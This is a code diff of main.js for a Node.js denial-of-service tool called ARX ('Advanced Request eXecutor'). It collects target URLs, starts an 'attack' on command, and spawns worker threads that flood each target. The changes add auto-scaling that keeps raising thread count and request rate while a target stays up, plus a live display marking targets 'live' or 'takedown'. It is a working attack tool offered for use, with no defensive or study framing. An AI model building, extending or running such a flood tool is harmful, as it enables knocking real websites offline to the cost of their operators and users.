@@ -1,42 +1,38 @@
 // main.js
-const readline = require("readline");
-const { Worker } = require("worker_threads");
-const os = require("os");
-const chalk = require("chalk");
-const http = require("http");
-const https = require("https");
+const readline = require('readline');
+const { Worker } = require('worker_threads');
+const os = require('os');
+const chalk = require('chalk');
+const http = require('http');
+const https = require('https');
 
 console.clear();
-console.log(
-  chalk.greenBright.bold(
-    "Selamat datang di ARX - Advanced Request eXecutor [AutoScale]"
-  )
-);
+console.log(chalk.greenBright.bold('Selamat datang di ARX - Advanced Request eXecutor [AutoScale]'));
 
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 readline.emitKeypressEvents(process.stdin);
 if (process.stdin.isTTY) process.stdin.setRawMode(true);
 
-let targets = [], stats = {}, statuses = {}, started = false, workerMap = {};
+let targets = [], workers = {}, stats = {}, statuses = {}, configs = {};
 
 function askURL(index = 0) {
-  rl.question(`Target URL #${index + 1} (leave blank to finish): `, async (url) => {
+  rl.question(`Target URL #${index + 1} (leave blank to finish): `, async url => {
     if (!url.trim()) {
       if (targets.length === 0) return askURL(index);
       return askCommand();
     }
     const isLive = await testTarget(url.trim());
     targets.push(url.trim());
-    statuses[url.trim()] = isLive ? "live" : "down";
+    statuses[url.trim()] = isLive ? 'live' : 'down';
     stats[url.trim()] = { sent: 0, success: 0, failed: 0 };
-    workerMap[url.trim()] = [];
+    configs[url.trim()] = { threads: 1, rps: 10, lastScale: Date.now() };
     askURL(index + 1);
   });
 }
 
 function askCommand() {
-  rl.question("Type \"start\" to begin attack: ", (input) => {
-    if (input.trim().toLowerCase() === "start") {
+  rl.question('Type "start" to begin attack: ', (input) => {
+    if (input.trim().toLowerCase() === 'start') {
       startAttack();
     } else {
       askCommand();
@@ -45,14 +41,14 @@ function askCommand() {
 }
 
 function testTarget(url) {
-  return new Promise((resolve) => {
-    const lib = url.startsWith("https") ? https : http;
-    const req = lib.get(url, { timeout: 5000 }, (res) => {
+  return new Promise(resolve => {
+    const lib = url.startsWith('https') ? https : http;
+    const req = lib.get(url, { timeout: 5000 }, res => {
       res.resume();
       resolve(true);
     });
-    req.on("error", () => resolve(false));
-    req.on("timeout", () => {
+    req.on('error', () => resolve(false));
+    req.on('timeout', () => {
       req.destroy();
       resolve(false);
     });
@@ -60,48 +56,54 @@ function testTarget(url) {
 }
 
 function startAttack() {
-  started = true;
-  targets.forEach((url, index) => startTargetWorkers(url));
+  for (const url of targets) launchWorkers(url);
   displayStats();
+  autoScaleMonitor();
   listenCommand();
 }
 
-function startTargetWorkers(url) {
-  const cpuCount = os.cpus().length;
-  let threads = 1;
-  let rps = 10;
-
-  const scale = () => {
-    const usage = os.loadavg()[0] / cpuCount;
-    if (usage < 0.8 && threads < cpuCount * 2) {
-      threads++;
-      rps += 10;
-      const worker = createWorker(url, rps);
-      workerMap[url].push(worker);
-    }
-    setTimeout(scale, 10000);
-  };
-
-  for (let i = 0; i < threads; i++) {
-    const worker = createWorker(url, rps);
-    workerMap[url].push(worker);
-  }
-
-  scale();
-}
-
-function createWorker(url, rps) {
-  const worker = new Worker("./worker.js", {
-    workerData: { target: url, rps },
-  });
-  worker.on("message", ({ type, sent, success, failed }) => {
-    if (type === "stats") {
+function launchWorkers(url) {
+  workers[url] = [];
+  for (let j = 0; j < configs[url].threads; j++) {
+    const worker = new Worker('./worker.js', {
+      workerData: { target: url, rps: configs[url].rps }
+    });
+    worker.on('message', ({ sent, success, failed }) => {
       stats[url].sent += sent;
       stats[url].success += success;
       stats[url].failed += failed;
-    }
-  });
-  return worker;
+    });
+    workers[url].push(worker);
+  }
+}
+
+function scaleUp(url) {
+  const config = configs[url];
+  const cpuLoad = os.loadavg()[0] / os.cpus().length;
+  if (cpuLoad < 0.85 && statuses[url] === 'live' && Date.now() - config.lastScale > 10000) {
+    config.threads++;
+    config.rps += 10;
+    const worker = new Worker('./worker.js', {
+      workerData: { target: url, rps: config.rps }
+    });
+    worker.on('message', ({ sent, success, failed }) => {
+      stats[url].sent += sent;
+      stats[url].success += success;
+      stats[url].failed += failed;
+    });
+    workers[url].push(worker);
+    config.lastScale = Date.now();
+  }
+}
+
+function autoScaleMonitor() {
+  setInterval(() => {
+    targets.forEach(async (url) => {
+      const alive = await testTarget(url);
+      statuses[url] = alive ? 'live' : 'takedown';
+      scaleUp(url);
+    });
+  }, 10000);
 }
 
 function displayStats() {
@@ -109,26 +111,21 @@ function displayStats() {
     readline.cursorTo(process.stdout, 0, 2);
     targets.forEach((url, i) => {
       const s = stats[url];
-      const status =
-        statuses[url] === "live"
-          ? chalk.greenBright("Alive")
-          : chalk.redBright("Takedown");
+      const status = statuses[url] === 'live' ? chalk.greenBright('live') : chalk.redBright('takedown');
       readline.clearLine(process.stdout, 0);
-      process.stdout.write(
-        `[${chalk.blueBright(`#${i}`)}] ${chalk.yellow("Sent")}: ${s.sent} | ${chalk.green("Success")}: ${s.success} | ${chalk.red("Failed")}: ${s.failed} | ${chalk.cyan("Target")}: ${url} | ${status}\n`
-      );
+      process.stdout.write(`[STATS #${i}] ${chalk.yellow('Sent')}: ${s.sent} | ${chalk.green('Success')}: ${s.success} | ${chalk.red('Failed')}: ${s.failed} | ${chalk.cyan('Target')}: ${url} | ${status}\n`);
     });
     readline.moveCursor(process.stdout, 0, 1);
     readline.clearLine(process.stdout, 0);
-    process.stdout.write("Command (stop): ");
-  }, 60000);
+    process.stdout.write('Command (stop): ');
+  }, 1000);
 }
 
 function listenCommand() {
-  rl.on("line", (line) => {
-    if (line.trim().toLowerCase() === "stop") {
-      Object.values(workerMap).flat().forEach((w) => w.terminate());
-      console.log(chalk.redBright("\n[STOPPED] All targets stopped."));
+  rl.on('line', line => {
+    if (line.trim().toLowerCase() === 'stop') {
+      targets.forEach(url => workers[url].forEach(w => w.terminate()));
+      console.log(chalk.redBright('\n[STOPPED] All targets stopped.'));
       process.exit(0);
     }
   });
